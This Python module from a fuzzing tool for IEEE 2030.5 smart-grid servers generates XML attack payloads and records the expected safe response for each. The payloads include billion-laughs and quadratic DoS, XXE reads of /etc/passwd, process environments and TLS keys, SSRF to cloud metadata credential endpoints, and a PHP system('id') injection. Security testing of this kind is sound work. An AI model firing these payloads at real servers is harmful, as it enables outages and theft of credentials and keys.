"""
der_sep2.fuzzing.xml_payloads
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
XML attack payload generators for IEEE 2030.5 fuzzing.

Each payload function returns a list of FuzzPayload objects.
Payloads are injected into real 2030.5 XML templates so they
look like plausible requests — not obviously malformed garbage
that a WAF or schema validator would drop before the parser
even sees them.

Vulnerability classes covered:
  - Billion laughs (exponential entity expansion)
  - Quadratic blowup (polynomial expansion)
  - XXE file disclosure (local file read via external entity)
  - XXE SSRF (server-side request forgery via external entity)
  - DTD external subset injection
  - Oversized field values (buffer overflow / DoS candidates)
  - Deep nesting (stack overflow candidates)
  - Malformed XML (parser crash candidates)
  - Namespace confusion
  - Null bytes and encoding attacks
"""

from __future__ import annotations

from dataclasses import dataclass
from enum import Enum


class VulnClass(Enum):
    BILLION_LAUGHS    = "billion_laughs"
    QUADRATIC_BLOWUP  = "quadratic_blowup"
    XXE_FILE          = "xxe_file_disclosure"
    XXE_SSRF          = "xxe_ssrf"
    XXE_DTD           = "xxe_dtd_external"
    OVERSIZED         = "oversized_payload"
    DEEP_NESTING      = "deep_nesting"
    MALFORMED         = "malformed_xml"
    NAMESPACE         = "namespace_confusion"
    ENCODING          = "encoding_attack"


@dataclass
class FuzzPayload:
    """A single XML fuzzing payload."""
    name:         str
    vuln_class:   VulnClass
    body:         bytes
    description:  str
    # Expected safe server behaviour — what we WANT to see
    expect_safe:  str = "400 Bad Request or connection close without hang"
    # If response time exceeds this, flag as potential DoS
    timeout_flag_secs: float = 5.0


# ---------------------------------------------------------------------------
# 2030.5 XML namespace and minimal valid templates
#
# We wrap payloads in real 2030.5 elements so they pass superficial
# content-type and namespace checks before hitting the XML parser.
# ---------------------------------------------------------------------------

SEP2_NS = "urn:ieee:std:2030.5:ns"

# Minimal EndDevice POST body — the most commonly writable resource
_ENDDEVICE_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-8"?>
{preamble}<EndDevice xmlns="{ns}">
  <lFDI>{lfdi}</lFDI>
  <sFDI>{sfdi}</sFDI>
  <changedTime>{changed}</changedTime>
  {extra}
</EndDevice>"""

# Minimal DERCapability — writable on some servers
_DERCAP_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-8"?>
{preamble}<DERCapability xmlns="{ns}">
  <modesSupported>{modes}</modesSupported>
  {extra}
</DERCapability>"""

# Minimal LogEvent POST
_LOGEVENT_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-8"?>
{preamble}<LogEvent xmlns="{ns}">
  <createdDateTime>{ts}</createdDateTime>
  <details>{details}</details>
  <extendedData>{ext}</extendedData>
  <functionSet>0</functionSet>
  <importance>0</importance>
  <text>{text}</text>
</LogEvent>"""

# Minimal Subscription POST — /edev/{id}/sub
_SUBSCRIPTION_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-8"?>
{preamble}<Subscription xmlns="{ns}">
  <subscribedResource>{resource}</subscribedResource>
</Subscription>"""


def _enddevice(preamble="", lfdi="aabbccdd" * 5, sfdi="aabbcc",
               changed="0", extra="") -> str:
    return _ENDDEVICE_TEMPLATE.format(
        preamble=preamble, ns=SEP2_NS, lfdi=lfdi,
        sfdi=sfdi, changed=changed, extra=extra,
    )


def _logevent(preamble="", ts="0", details="test",
              ext="0", text="test") -> str:
    return _LOGEVENT_TEMPLATE.format(
        preamble=preamble, ns=SEP2_NS, ts=ts,
        details=details, ext=ext, text=text,
    )


def _subscription(preamble="", resource="/edev/0/der") -> str:
    return _SUBSCRIPTION_TEMPLATE.format(
        preamble=preamble, ns=SEP2_NS, resource=resource,
    )


# ---------------------------------------------------------------------------
# Billion laughs payloads
# ---------------------------------------------------------------------------

def billion_laughs_payloads() -> list[FuzzPayload]:
    payloads = []

    # Classic 10-level exponential expansion
    # Each entity references the previous 10 times → 10^10 expansions
    classic = f"""\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<EndDevice xmlns="{SEP2_NS}">
  <lFDI>&lol9;</lFDI>
  <sFDI>aabbcc</sFDI>
  <changedTime>0</changedTime>
</EndDevice>"""

    payloads.append(FuzzPayload(
        name        = "billion_laughs_classic",
        vuln_class  = VulnClass.BILLION_LAUGHS,
        body        = classic.encode(),
        description = "Classic 10-level billion laughs — 10^10 entity expansions",
        timeout_flag_secs = 3.0,
    ))

    # Wrapped in a valid SEP2 LogEvent — tests if schema validation happens
    # before or after entity expansion
    wrapped = f"""\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [
  <!ENTITY a "aaaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
  <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
  <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
  <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
]>
<LogEvent xmlns="{SEP2_NS}">
  <createdDateTime>0</createdDateTime>
  <details>&h;</details>
  <extendedData>0</extendedData>
  <functionSet>0</functionSet>
  <importance>0</importance>
  <text>test</text>
</LogEvent>"""

    payloads.append(FuzzPayload(
        name        = "billion_laughs_logevent",
        vuln_class  = VulnClass.BILLION_LAUGHS,
        body        = wrapped.encode(),
        description = "Billion laughs inside LogEvent — tests pre-schema entity expansion",
        timeout_flag_secs = 3.0,
    ))

    return payloads


# ---------------------------------------------------------------------------
# Quadratic blowup payloads
# ---------------------------------------------------------------------------

def quadratic_blowup_payloads() -> list[FuzzPayload]:
    """
    Quadratic blowup: one large entity referenced many times.
    Expansion is O(n^2) rather than O(k^n) — subtler but often bypasses
    entity expansion limits that only count nesting depth.
    A 50KB entity referenced 50,000 times = 2.5GB of expanded text.
    """
    payloads = []

    # 50KB base entity
    large_value = "A" * 50_000
    body = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [
  <!ENTITY large "{value}">
]>
<LogEvent xmlns="{ns}">
  <createdDateTime>0</createdDateTime>
  <details>{refs}</details>
  <extendedData>0</extendedData>
  <functionSet>0</functionSet>
  <importance>0</importance>
  <text>test</text>
</LogEvent>""".format(
        ns    = SEP2_NS,
        value = large_value,
        refs  = "&large;" * 50_000,
    )

    payloads.append(FuzzPayload(
        name        = "quadratic_blowup",
        vuln_class  = VulnClass.QUADRATIC_BLOWUP,
        body        = body.encode(),
        description = "50KB entity × 50,000 references = ~2.5GB expanded (quadratic DoS)",
        timeout_flag_secs = 3.0,
    ))

    return payloads


# ---------------------------------------------------------------------------
# XXE — file disclosure
# ---------------------------------------------------------------------------

def xxe_file_payloads() -> list[FuzzPayload]:
    """
    XXE payloads attempting to read local files via external entity.
    Tests for both inline disclosure (entity value in response) and
    out-of-band disclosure (error-based).

    Entity resolution happens during parsing regardless of which element
    holds it, but a server only ever echoes back specific fields it reads
    out of the submitted tree (e.g. EndDevice POST → lFDI, Subscription
    POST → subscribedResource) -- a target's parser can be genuinely
    vulnerable while a payload whose entity lands in a field the target
    never reads back stays invisible in the response. Since this fuzzer
    doesn't know a given server's echo behavior in advance, each file
    target is sent in three shapes (LogEvent/details, EndDevice/lFDI,
    Subscription/subscribedResource) covering the fields real 2030.5
    "resource created" responses commonly echo.
    """
    payloads = []

    # Common sensitive files to try
    targets = [
        ("/etc/passwd",       "Linux password file"),
        ("/etc/hosts",        "Hosts file — reveals network topology"),
        ("/proc/self/environ","Process environment — may contain secrets"),
        ("/etc/ssl/private/server.key", "TLS private key"),
        ("C:\\Windows\\win.ini", "Windows config (if Windows server)"),
    ]

    shapes = [
        ("logevent",     "LogEvent/details",
         lambda dtd: _logevent(preamble=dtd + "\n", details="&xxe;")),
        ("enddevice",    "EndDevice/lFDI",
         lambda dtd: _enddevice(preamble=dtd + "\n", lfdi="&xxe;")),
        ("subscription", "Subscription/subscribedResource",
         lambda dtd: _subscription(preamble=dtd + "\n", resource="&xxe;")),
    ]

    for filepath, description in targets:
        dtd = f'<!DOCTYPE x [\n  <!ENTITY xxe SYSTEM "file://{filepath}">\n]>'
        for shape_key, shape_label, build in shapes:
            payloads.append(FuzzPayload(
                name        = f"xxe_file_{shape_key}_{filepath.replace('/', '_').strip('_')}",
                vuln_class  = VulnClass.XXE_FILE,
                body        = build(dtd).encode(),
                description = f"XXE file disclosure via {shape_label}: {description} ({filepath})",
                expect_safe = "400 or response body does not contain file contents",
            ))

    # Parameter entity variant — bypasses some naive XXE filters
    param_dtd = """\
<!DOCTYPE x [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'file:///etc/passwd'>">
  %eval;
]>"""
    for shape_key, shape_label, build in (
        ("logevent",  "LogEvent/details", lambda dtd: _logevent(preamble=dtd + "\n", details="&exfil;")),
        ("enddevice", "EndDevice/lFDI",   lambda dtd: _enddevice(preamble=dtd + "\n", lfdi="&exfil;")),
    ):
        payloads.append(FuzzPayload(
            name        = f"xxe_parameter_entity_{shape_key}",
            vuln_class  = VulnClass.XXE_FILE,
            body        = build(param_dtd).encode(),
            description = f"XXE via parameter entity ({shape_label}) — bypasses simple entity name filters",
        ))

    return payloads


# ---------------------------------------------------------------------------
# XXE — SSRF
# ---------------------------------------------------------------------------

def xxe_ssrf_payloads(
    callback_host: str = "127.0.0.1",
    callback_port: int = 9999,
) -> list[FuzzPayload]:
    """
    XXE payloads that attempt to make the server issue HTTP requests
    to internal hosts (SSRF). The callback_host/port can be pointed at
    a netcat listener to observe OOB requests.

    Also tries common internal services:
      - The 2030.5 server's own admin interface
      - Common internal ports (metadata services, etc.)
    """
    payloads = []

    ssrf_targets = [
        (f"http://{callback_host}:{callback_port}/xxe-probe",
         "OOB callback — confirms SSRF if your listener receives a request"),
        ("http://169.254.169.254/latest/meta-data/",
         "AWS metadata service — reveals cloud credentials if running on EC2"),
        ("http://169.254.170.2/v2/credentials",
         "ECS metadata service"),
        ("http://localhost:8080/",
         "Common internal admin port"),
        ("http://localhost:9000/",
         "Common internal service port"),
    ]

    for url, description in ssrf_targets:
        body = f"""\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [
  <!ENTITY ssrf SYSTEM "{url}">
]>
<LogEvent xmlns="{SEP2_NS}">
  <createdDateTime>0</createdDateTime>
  <details>&ssrf;</details>
  <extendedData>0</extendedData>
  <functionSet>0</functionSet>
  <importance>0</importance>
  <text>test</text>
</LogEvent>"""

        payloads.append(FuzzPayload(
            name        = f"xxe_ssrf_{url.split('/')[2].replace('.', '_').replace(':', '_')}",
            vuln_class  = VulnClass.XXE_SSRF,
            body        = body.encode(),
            description = f"XXE SSRF: {description}",
            expect_safe = "400 or timeout without outbound connection",
            timeout_flag_secs = 5.0,
        ))

    return payloads


# ---------------------------------------------------------------------------
# Oversized payload DoS
# ---------------------------------------------------------------------------

def oversized_payloads() -> list[FuzzPayload]:
    payloads = []

    # Very long lFDI field (should be 40 hex chars, send 1MB)
    payloads.append(FuzzPayload(
        name        = "oversized_lfdi",
        vuln_class  = VulnClass.OVERSIZED,
        body        = _enddevice(lfdi="a" * 1_000_000).encode(),
        description = "lFDI field padded to 1MB — tests field length validation",
    ))

    # Huge number of repeated child elements
    many_children = "\n  ".join(
        f"<description>child {i}</description>" for i in range(100_000)
    )
    payloads.append(FuzzPayload(
        name        = "oversized_child_count",
        vuln_class  = VulnClass.OVERSIZED,
        body        = _enddevice(extra=many_children).encode(),
        description = "100,000 repeated child elements — tests element count limits",
    ))

    # Single massive text node (~10MB)
    payloads.append(FuzzPayload(
        name        = "oversized_text_node",
        vuln_class  = VulnClass.OVERSIZED,
        body        = _logevent(text="X" * 10_000_000).encode(),
        description = "10MB text node in LogEvent — tests XML parser memory limits",
        timeout_flag_secs = 5.0,
    ))

    return payloads


# ---------------------------------------------------------------------------
# Deep nesting
# ---------------------------------------------------------------------------

def deep_nesting_payloads() -> list[FuzzPayload]:
    payloads = []

    # 10,000 levels deep — stack overflow candidate
    depth = 10_000
    open_tags  = "".join(f"<x{i}>" for i in range(depth))
    close_tags = "".join(f"</x{i}>" for i in reversed(range(depth)))

    body = (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<EndDevice xmlns="{SEP2_NS}">\n'
        f'  <lFDI>{open_tags}deep{close_tags}</lFDI>\n'
        f'  <sFDI>aabbcc</sFDI>\n'
        f'  <changedTime>0</changedTime>\n'
        f'</EndDevice>'
    )

    payloads.append(FuzzPayload(
        name        = "deep_nesting_10k",
        vuln_class  = VulnClass.DEEP_NESTING,
        body        = body.encode(),
        description = "10,000 levels of nested XML elements — tests recursion/stack limits",
    ))

    # Wide nesting — many siblings at same level (different attack profile)
    wide = (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<EndDevice xmlns="{SEP2_NS}">'
        + "".join(f'<extra{i}>val</extra{i}>' for i in range(50_000))
        + '<lFDI>aabbccdd' * 5 + '</lFDI>'
        + '<sFDI>aabbcc</sFDI>'
        + '<changedTime>0</changedTime>'
        + '</EndDevice>'
    )

    payloads.append(FuzzPayload(
        name        = "wide_nesting_50k_siblings",
        vuln_class  = VulnClass.DEEP_NESTING,
        body        = wide.encode(),
        description = "50,000 sibling elements — tests breadth limits",
    ))

    return payloads


# ---------------------------------------------------------------------------
# Malformed XML
# ---------------------------------------------------------------------------

def malformed_payloads() -> list[FuzzPayload]:
    """
    Structurally broken XML intended to crash or misbehave in parsers
    that don't handle errors robustly.
    """
    payloads = []

    cases = [
        ("unclosed_tag",
         f'<?xml version="1.0"?><EndDevice xmlns="{SEP2_NS}"><lFDI>aabbcc',
         "Unclosed tag — abrupt EOF mid-element"),

        ("mismatched_tags",
         f'<?xml version="1.0"?><EndDevice xmlns="{SEP2_NS}"><lFDI>x</sFDI></EndDevice>',
         "Mismatched open/close tags"),

        ("double_root",
         f'<?xml version="1.0"?>'
         f'<EndDevice xmlns="{SEP2_NS}"><lFDI>x</lFDI><changedTime>0</changedTime></EndDevice>'
         f'<EndDevice xmlns="{SEP2_NS}"><lFDI>y</lFDI><changedTime>0</changedTime></EndDevice>',
         "Two root elements — invalid XML"),

        ("null_byte_in_value",
         f'<?xml version="1.0"?><EndDevice xmlns="{SEP2_NS}">'
         f'<lFDI>aabb\x00ccdd</lFDI><sFDI>aabb</sFDI><changedTime>0</changedTime>'
         f'</EndDevice>',
         "Null byte inside element value — C-string truncation attack"),

        ("invalid_utf8",
         b'<?xml version="1.0" encoding="UTF-8"?>'
         b'<EndDevice xmlns="urn:ieee:std:2030.5:ns">'
         b'<lFDI>\xff\xfe invalid utf8 \x80\x81</lFDI>'
         b'<sFDI>aabb</sFDI><changedTime>0</changedTime>'
         b'</EndDevice>',
         "Invalid UTF-8 byte sequences in element value"),

        ("cdata_injection",
         f'<?xml version="1.0"?><EndDevice xmlns="{SEP2_NS}">'
         f'<lFDI><![CDATA[<script>alert(1)</script>]]></lFDI>'
         f'<sFDI>aabb</sFDI><changedTime>0</changedTime></EndDevice>',
         "CDATA section — tests if server re-serialises without escaping"),

        ("processing_instruction",
         f'<?xml version="1.0"?>'
         f'<?php system("id"); ?>'
         f'<EndDevice xmlns="{SEP2_NS}">'
         f'<lFDI>aabbccdd</lFDI><sFDI>aabb</sFDI><changedTime>0</changedTime>'
         f'</EndDevice>',
         "Processing instruction injection — tests for PHP/SSI execution"),

        ("entity_in_attr",
         f'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY x "x">]>'
         f'<EndDevice xmlns="{SEP2_NS}" desc="&x;">'
         f'<lFDI>aabbccdd</lFDI><sFDI>aabb</sFDI><changedTime>0</changedTime>'
         f'</EndDevice>',
         "Entity reference in attribute value"),

        ("comment_bomb",
         f'<?xml version="1.0"?><EndDevice xmlns="{SEP2_NS}">'
         + "<!-- " + "A" * 10_000_000 + " -->"
         + '<lFDI>aabb</lFDI><sFDI>aabb</sFDI><changedTime>0</changedTime>'
         '</EndDevice>',
         "10MB XML comment — tests comment handling memory limits"),
    ]

    for name, body, description in cases:
        if isinstance(body, str):
            body = body.encode("utf-8", errors="replace")
        payloads.append(FuzzPayload(
            name        = f"malformed_{name}",
            vuln_class  = VulnClass.MALFORMED,
            body        = body,
            description = description,
        ))

    return payloads


# ---------------------------------------------------------------------------
# Namespace confusion
# ---------------------------------------------------------------------------

def namespace_payloads() -> list[FuzzPayload]:
    payloads = []

    # Wrong namespace — does the server reject or silently accept?
    wrong_ns = b"""\
<?xml version="1.0" encoding="UTF-8"?>
<EndDevice xmlns="http://evil.example.com/malicious">
  <lFDI>aabbccddaabbccddaabbccddaabbccddaabbccdd</lFDI>
  <sFDI>aabbcc</sFDI>
  <changedTime>0</changedTime>
</EndDevice>"""

    payloads.append(FuzzPayload(
        name        = "wrong_namespace",
        vuln_class  = VulnClass.NAMESPACE,
        body        = wrong_ns,
        description = "Wrong XML namespace — server should reject; acceptance = namespace not validated",
        expect_safe = "400 Bad Request",
    ))

    # Namespace prefix confusion
    prefix_confusion = f"""\
<?xml version="1.0" encoding="UTF-8"?>
<sep:EndDevice xmlns:sep="{SEP2_NS}" xmlns:evil="http://evil.example.com">
  <sep:lFDI>aabbccddaabbccddaabbccddaabbccddaabbccdd</sep:lFDI>
  <evil:inject>malicious content</evil:inject>
  <sep:sFDI>aabbcc</sep:sFDI>
  <sep:changedTime>0</sep:changedTime>
</sep:EndDevice>""".encode()

    payloads.append(FuzzPayload(
        name        = "namespace_prefix_confusion",
        vuln_class  = VulnClass.NAMESPACE,
        body        = prefix_confusion,
        description = "Mixed namespaces — injects elements from a foreign namespace",
    ))

    return payloads


# ---------------------------------------------------------------------------
# Master payload list
# ---------------------------------------------------------------------------

def all_payloads(
    callback_host: str = "127.0.0.1",
    callback_port: int = 9999,
) -> list[FuzzPayload]:
    """Return all payloads across all vulnerability classes."""
    return (
        billion_laughs_payloads()
        + quadratic_blowup_payloads()
        + xxe_file_payloads()
        + xxe_ssrf_payloads(callback_host, callback_port)
        + oversized_payloads()
        + deep_nesting_payloads()
        + malformed_payloads()
        + namespace_payloads()
    )


def payloads_by_class(vuln_class: VulnClass) -> list[FuzzPayload]:
    return [p for p in all_payloads() if p.vuln_class == vuln_class]
